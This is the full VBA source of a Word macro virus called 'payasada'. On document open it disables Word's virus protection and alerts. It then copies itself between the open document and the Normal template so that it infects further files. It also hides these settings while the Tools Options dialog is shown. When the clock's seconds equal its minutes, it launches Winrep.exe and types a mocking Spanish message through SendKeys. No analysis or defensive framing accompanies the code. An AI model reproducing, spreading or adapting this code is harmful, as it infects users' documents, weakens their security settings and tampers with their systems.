   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "payasada"
   Sub AutoOpen()
   '
   ' AutoOpen Macro
   ' Payasada!!!


   On Error GoTo payasada

       Application.ScreenUpdating = False
       Application.DisplayAlerts = wdAlertsNone

       WordBasic.DisableAutoMacros 0
       Options.VirusProtection = False

       'Set ActiveDoc = ActiveDocument
       'Set GlobalDoc = NormalTemplate


   If Not DocInfectado() Then
       Docinf
   End If

   If Not NormalInfectado() Then
       Norinf
   End If

   Call Trues

   payasada:
   End Sub
   Private Sub Docinf()
   On Error GoTo InfecDocError

       Application.OrganizerCopy Source:=NormalTemplate.FullName, _
       Destination:=ActiveDocument.FullName, Name:="payasada", _
       Object:=wdOrganizerObjectProjectItems

   InfecDocError:
   End Sub
   Private Sub Norinf()
   On Error GoTo InfecDocError

       Application.OrganizerCopy Source:=ActiveDocument.FullName, _
       Destination:=NormalTemplate.FullName, Name:="payasada", _
       Object:=wdOrganizerObjectProjectItems
       Options.SaveNormalPrompt = True

   InfecDocError:
   End Sub
   Public Function DocInfectado()
   On Error GoTo DocInfectError
   For i = 1 To ActiveDocument.VBProject.VBComponents.Count
           If ActiveDocument.VBProject.VBComponents(i).Name = "payasada" Then
               DocInfectado = True
           End If
   Next

   DocInfectError:
   End Function

   Public Function NormalInfectado()

   On Error GoTo NormalInfectError
   For J = 1 To NormalTemplate.VBProject.VBComponents.Count
           If NormalTemplate.VBProject.VBComponents(J).Name = "payasada" Then
               NormalInfectado = True
           End If
   Next


   NormalInfectError:
   End Function

   Sub Trues()
   If Second(Now) = Minute(Now) Then Call Payasadas


   End Sub

   Sub Payasadas()
   On Error Resume Next
   Options.BlueScreen = True
   MyApp = Shell("Winrep.exe", 1)
   SendKeys "Hola, creo que me han infectado de nuevo.  YA ME TIENEN HARTO!!!    ATT, El sistema", True


   End Sub


   Sub AutoClose()
   On Error Resume Next
   Call Trues

   End Sub



   Sub ToolsOptions()
   On Error Resume Next
   Options.VirusProtection = 1
   Options.SaveNormalPrompt = 1
   Dialogs(wdDialogToolsOptions).Show
   Options.VirusProtection = 0
   Options.SaveNormalPrompt = 0
   End Sub
